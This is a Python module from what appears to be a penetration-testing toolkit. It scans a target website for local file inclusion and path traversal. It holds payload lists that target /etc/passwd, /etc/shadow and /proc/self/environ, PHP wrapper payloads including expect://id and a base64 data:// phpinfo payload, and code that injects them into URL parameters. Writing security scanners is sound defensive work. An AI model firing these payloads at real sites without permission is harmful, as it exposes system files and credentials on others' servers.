"""Module 31 — Directory Traversal & LFI Testing.

Tests for Local File Inclusion (LFI) and directory/path traversal
vulnerabilities in URL parameters and API endpoints.
"""

import json
import logging
import re
from pathlib import Path

import requests

logger = logging.getLogger("cyberpulse.modules.m31")

# LFI/Path traversal payloads
LFI_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "..%252f..%252f..%252fetc/passwd",
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hostname",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://input",
    "file:///etc/passwd",
    "expect://id",
    "/var/log/apache2/access.log",
    "/var/log/nginx/access.log",
]

# Parameters commonly vulnerable to LFI
LFI_PARAMS = [
    "file", "path", "page", "template", "include", "doc",
    "document", "folder", "root", "pg", "style", "pdf",
    "img", "filename", "view", "content", "layout",
    "mod", "module", "conf", "lang", "dir",
]


class Scanner:
    name = "Directory Traversal & LFI"
    phase = "exploitation"
    description = "Tests for Local File Inclusion and path traversal vulnerabilities"

    def __init__(self, target: str, output_dir: Path, config: dict):
        self.target = target
        self.output_dir = Path(output_dir)
        self.config = config
        self.session = requests.Session()
        self.session.headers["User-Agent"] = "Mozilla/5.0 CyberPulse/1.0"
        self.session.verify = False

    def run(self) -> dict:
        findings = []
        raw_lines = [f"LFI / Path Traversal testing for {self.target}"]
        base_url = self._get_base_url()

        # Phase 1: Test common parameter injection
        raw_lines.append("\n[Phase 1: Parameter-based LFI]")
        for param in LFI_PARAMS:
            for payload in LFI_PAYLOADS[:8]:
                url = f"{base_url}/?{param}={payload}"
                try:
                    resp = self.session.get(url, timeout=10)
                    if self._lfi_successful(resp):
                        findings.append({
                            "type": "lfi_param",
                            "parameter": param,
                            "payload": payload,
                            "detail": f"LFI via parameter '{param}' with payload: {payload}",
                            "severity": "critical",
                        })
                        raw_lines.append(f"  CRITICAL: LFI via ?{param}={payload[:40]}")
                        break
                except Exception:
                    continue

        # Phase 2: Test known vulnerable paths
        raw_lines.append("\n[Phase 2: Path-based Traversal]")
        traversal_paths = [
            "/static/../../../etc/passwd",
            "/images/../../../etc/passwd",
            "/download?file=../../../etc/passwd",
            "/api/file?path=../../../etc/passwd",
            "/include.php?file=../../../etc/passwd",
            "/view?page=../../../etc/passwd",
            "/assets/..%2f..%2f..%2fetc/passwd",
        ]

        for path in traversal_paths:
            url = base_url + path
            try:
                resp = self.session.get(url, timeout=10)
                if self._lfi_successful(resp):
                    findings.append({
                        "type": "path_traversal",
                        "path": path,
                        "detail": f"Path traversal at {path}",
                        "severity": "critical",
                    })
                    raw_lines.append(f"  CRITICAL: Path traversal at {path}")
            except Exception:
                continue

        # Phase 3: Crawl and test discovered parameters
        raw_lines.append("\n[Phase 3: Crawled Parameters]")
        crawled_urls = self._crawl_for_params(base_url)
        raw_lines.append(f"  Found {len(crawled_urls)} URLs with parameters")

        for page_url in crawled_urls[:15]:
            for payload in LFI_PAYLOADS[:4]:
                test_url = self._inject_payload(page_url, payload)
                if test_url:
                    try:
                        resp = self.session.get(test_url, timeout=10)
                        if self._lfi_successful(resp):
                            findings.append({
                                "type": "lfi_crawled",
                                "url": test_url[:200],
                                "detail": f"LFI found in crawled URL: {test_url[:100]}",
                                "severity": "critical",
                            })
                            raw_lines.append(f"  CRITICAL: {test_url[:80]}")
                            break
                    except Exception:
                        continue

        # Phase 4: PHP wrapper tests
        raw_lines.append("\n[Phase 4: PHP Wrapper Tests]")
        php_wrappers = [
            "php://filter/convert.base64-encode/resource=index",
            "php://filter/convert.base64-encode/resource=config",
            "php://filter/convert.base64-encode/resource=../config",
            "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
        ]

        for param in ["page", "file", "include", "template"]:
            for wrapper in php_wrappers:
                url = f"{base_url}/?{param}={wrapper}"
                try:
                    resp = self.session.get(url, timeout=10)
                    if resp.status_code == 200 and len(resp.text) > 100:
                        # Check if base64 encoded content is returned
                        import base64
                        try:
                            decoded = base64.b64decode(resp.text.strip())
                            if b"<?php" in decoded or b"<?" in decoded:
                                findings.append({
                                    "type": "php_wrapper_lfi",
                                    "parameter": param,
                                    "wrapper": wrapper,
                                    "detail": f"PHP filter wrapper LFI via '{param}' — source code exposed!",
                                    "severity": "critical",
                                })
                                raw_lines.append(f"  CRITICAL: PHP source exposed via {param}")
                                break
                        except Exception:
                            pass
                except Exception:
                    continue

        raw_output = "\n".join(raw_lines)
        outfile = self.output_dir / "31_lfi.json"
        with open(outfile, "w", encoding="utf-8") as f:
            json.dump({"findings": findings}, f, indent=2)

        logger.info("LFI/Traversal scan %s: %d findings", self.target, len(findings))
        return {"findings": findings, "raw_output": raw_output}

    def _lfi_successful(self, resp) -> bool:
        if not resp or resp.status_code != 200:
            return False
        body = resp.text
        indicators = [
            "root:", "daemon:", "nobody:", "/bin/bash", "/bin/sh",
            "127.0.0.1", "localhost",
            "DOCUMENT_ROOT", "SERVER_SOFTWARE", "HTTP_HOST",
            "[boot loader]", "\\windows\\system32",
        ]
        return any(ind in body for ind in indicators)

    def _crawl_for_params(self, base_url: str) -> list[str]:
        """Find URLs with parameters from main page."""
        urls = []
        try:
            resp = self.session.get(base_url, timeout=10)
            links = re.findall(r'href=["\']([^"\']*\?[^"\']*)["\']', resp.text)
            for link in links:
                for param in LFI_PARAMS:
                    if f"{param}=" in link.lower():
                        full = link if link.startswith("http") else base_url + link
                        urls.append(full)
        except Exception:
            pass
        return list(set(urls))

    def _inject_payload(self, url: str, payload: str) -> str | None:
        """Replace parameter values in URL with LFI payload."""
        for param in LFI_PARAMS:
            pattern = f"({param}=)[^&]*"
            if re.search(pattern, url, re.I):
                return re.sub(pattern, f"\\g<1>{payload}", url, flags=re.I)
        return None

    def _get_base_url(self) -> str:
        for scheme in ("https", "http"):
            try:
                self.session.head(f"{scheme}://{self.target}", timeout=5)
                return f"{scheme}://{self.target}"
            except Exception:
                continue
        return f"http://{self.target}"
